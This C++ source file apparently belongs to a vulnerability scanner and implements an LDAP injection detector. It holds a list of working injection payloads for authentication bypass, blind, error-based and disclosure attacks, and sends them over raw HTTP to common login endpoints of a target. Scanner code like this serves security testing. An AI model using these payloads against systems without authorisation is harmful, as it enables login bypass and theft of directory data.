#include "../include/LDAPInjectionDetector.h"
#include "../include/mitre/AttackMapper.h"
#include <sstream>
#include <algorithm>
#include <chrono>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <netdb.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket close
#endif

std::vector<LDAPInjectionDetector::LDAPPayload> LDAPInjectionDetector::getLDAPPayloads() {
    return {
        // Authentication bypass
        {"*", "bypass", "Wildcard filter - bypasses authentication"},
        {"admin)(&", "bypass", "Filter injection - closes filter prematurely"},
        {"*)(uid=*))(|(uid=*", "bypass", "Complex filter injection"},
        
        // Boolean-based blind injection
        {"admin)(|(password=*))", "blind", "OR condition - always true"},
        {"admin)(|(objectClass=*))", "blind", "ObjectClass enumeration"},
        
        // Error-based injection
        {"admin)(!(&(1=0", "error", "Malformed filter - triggers error"},
        {"admin))%00", "error", "Null byte injection"},
        
        // Information disclosure
        {"*)(objectClass=*", "disclosure", "Schema enumeration"},
        {"*)(cn=*)(|(cn=*", "disclosure", "Common name extraction"},
        
        // Time-based blind
        {"admin)(&(objectClass=*)(sleep(5", "time", "Time-based detection"}
    };
}

std::string LDAPInjectionDetector::urlEncode(const std::string& str) {
    std::ostringstream encoded;
    for (unsigned char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded << c;
        } else {
            encoded << '%' << std::hex << std::uppercase << (int)c;
        }
    }
    return encoded.str();
}

std::string LDAPInjectionDetector::sendHTTPRequest(const std::string& target, const std::string& payload) {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return "";
    }
#endif

    std::string host = target;
    int port = 80;
    
    size_t colonPos = target.find(':');
    if (colonPos != std::string::npos) {
        host = target.substr(0, colonPos);
        port = std::stoi(target.substr(colonPos + 1));
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
#ifdef _WIN32
        WSACleanup();
#endif
        return "";
    }

    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, host.c_str(), &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
#ifdef _WIN32
        WSACleanup();
#endif
        return "";
    }

    // Test multiple common LDAP endpoints
    std::vector<std::string> endpoints = {
        "/ldap/search?user=" + urlEncode(payload),
        "/api/ldap?username=" + urlEncode(payload),
        "/auth/ldap?uid=" + urlEncode(payload),
        "/login?username=" + urlEncode(payload)
    };

    std::string response;
    for (const auto& endpoint : endpoints) {
        std::string request = 
            "GET " + endpoint + " HTTP/1.1\r\n"
            "Host: " + host + "\r\n"
            "User-Agent: C3NT1P3D3-Scanner/2.0\r\n"
            "Accept: */*\r\n"
            "Connection: close\r\n\r\n";

        send(sock, request.c_str(), request.length(), 0);

        char buffer[4096];
        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            response = std::string(buffer);
            if (!response.empty()) {
                break;
            }
        }
    }

    closesocket(sock);
#ifdef _WIN32
    WSACleanup();
#endif

    return response;
}

bool LDAPInjectionDetector::containsLDAPError(const std::string& response) {
    std::vector<std::string> errorPatterns = {
        "LDAP",
        "javax.naming",
        "LdapException",
        "Invalid DN syntax",
        "Bad search filter",
        "ldap_search",
        "com.sun.jndi.ldap",
        "LDAPException",
        "Invalid LDAP filter",
        "LDAP error code",
        "ldap_bind",
        "ldap_error"
    };

    std::string lowerResponse = response;
    std::transform(lowerResponse.begin(), lowerResponse.end(), lowerResponse.begin(), ::tolower);

    for (const auto& pattern : errorPatterns) {
        std::string lowerPattern = pattern;
        std::transform(lowerPattern.begin(), lowerPattern.end(), lowerPattern.begin(), ::tolower);
        if (lowerResponse.find(lowerPattern) != std::string::npos) {
            return true;
        }
    }

    return false;
}

bool LDAPInjectionDetector::indicatesBlindInjection(const std::string& response1, const std::string& response2) {
    // Check for significant differences in response
    if (response1.empty() || response2.empty()) {
        return false;
    }

    // Compare response lengths
    size_t lengthDiff = (response1.length() > response2.length()) ?
        response1.length() - response2.length() :
        response2.length() - response1.length();

    // Significant difference indicates blind injection
    if (lengthDiff > 100) {
        return true;
    }

    // Check for different HTTP status codes
    auto extractStatus = [](const std::string& resp) -> int {
        size_t pos = resp.find("HTTP/1.");
        if (pos != std::string::npos) {
            size_t statusPos = resp.find(' ', pos);
            if (statusPos != std::string::npos) {
                return std::stoi(resp.substr(statusPos + 1, 3));
            }
        }
        return 0;
    };

    int status1 = extractStatus(response1);
    int status2 = extractStatus(response2);

    return status1 != status2 && status1 != 0 && status2 != 0;
}

ModuleResult LDAPInjectionDetector::run(const MockTarget& target) {
    ModuleResult result;
    result.id = "LDAPInjectionDetector";
    result.targetId = target.id();
    result.success = false;
    result.severity = Severity::Low;

    auto payloads = getLDAPPayloads();
    std::vector<std::string> vulnerabilityEvidence;

    // Test error-based injection
    for (const auto& payload : payloads) {
        if (payload.type == "error") {
            std::string response = sendHTTPRequest(target.id(), payload.payload);
            
            if (containsLDAPError(response)) {
                result.success = true;
                result.severity = Severity::High;
                vulnerabilityEvidence.push_back(
                    "Error-based LDAP injection detected with payload: " + payload.payload
                );
                vulnerabilityEvidence.push_back("Description: " + payload.description);
            }
        }
    }

    // Test blind injection (compare true vs false conditions)
    std::string truePayload = "*";
    std::string falsePayload = "nonexistent_user_12345";
    
    std::string trueResponse = sendHTTPRequest(target.id(), truePayload);
    std::string falseResponse = sendHTTPRequest(target.id(), falsePayload);

    if (indicatesBlindInjection(trueResponse, falseResponse)) {
        result.success = true;
        result.severity = Severity::High;
        vulnerabilityEvidence.push_back(
            "Blind LDAP injection detected - responses differ significantly"
        );
        vulnerabilityEvidence.push_back(
            "True condition response length: " + std::to_string(trueResponse.length())
        );
        vulnerabilityEvidence.push_back(
            "False condition response length: " + std::to_string(falseResponse.length())
        );
    }

    // Test authentication bypass
    for (const auto& payload : payloads) {
        if (payload.type == "bypass") {
            std::string response = sendHTTPRequest(target.id(), payload.payload);
            
            // Check for successful authentication indicators
            if (response.find("200 OK") != std::string::npos &&
                (response.find("authenticated") != std::string::npos ||
                 response.find("success") != std::string::npos ||
                 response.find("welcome") != std::string::npos)) {
                
                result.success = true;
                result.severity = Severity::Critical;
                vulnerabilityEvidence.push_back(
                    "Authentication bypass detected with payload: " + payload.payload
                );
            }
        }
    }

    if (result.success) {
        result.message = "LDAP injection vulnerability detected";
        result.details = "LDAP injection vulnerability detected. Attacker can manipulate LDAP queries to bypass authentication, extract sensitive directory information, or enumerate users.\n\nEvidence:\n";
        for (const auto& evidence : vulnerabilityEvidence) {
            result.details = result.details.value() + "- " + evidence + "\n";
        }
    } else {
        result.message = "No LDAP injection vulnerabilities detected";
        result.details = "No LDAP injection vulnerabilities detected. Application appears to properly sanitize LDAP queries.";
    }

    return result;
}
